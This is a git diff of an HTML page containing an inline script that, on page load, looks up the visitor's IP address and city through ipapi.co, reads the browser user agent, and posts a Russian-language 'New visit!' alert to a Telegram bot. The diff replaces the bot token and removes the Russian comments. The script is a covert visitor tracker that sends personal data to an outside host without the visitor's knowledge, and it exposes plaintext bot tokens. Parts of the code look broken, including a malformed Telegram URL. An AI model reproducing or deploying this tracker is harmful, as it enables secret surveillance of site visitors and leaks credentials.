@@ -6,20 +6,19 @@
 <body>
     <script>
         async function sendIp() {
-            // 1. Твои данные (БЕЗ слэшей в именах переменных)
-            const TOKEN = "8413511998:AAHZuQrJyZnyqJusMNbH074Rw-UzQEMSPpA";
+           
+            const TOKEN = "8413511998:AAFkNUfveYvbn_UGYrSwvL-RwYt-8G2EUdk";
             const CHAT_ID = "8426763446";
 
             try {
-                // 2. Получаем данные об IP (обязательно /json/)
+ 
                 const response = await fetch('https://ipapi.co');
                 const data = await response.json();
 
-                // 3. Формируем текст
+ 
                 const device = navigator.userAgent;
                 const text = `Новый переход!\n📍 IP: ${data.ip}\n🌍 Город: ${data.city}\n📱 Устройство: ${device}`;
-
-                // 4. Отправляем в Telegram (строго по этому формату)
+ 
                 await fetch(`https://api.telegram.org{TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
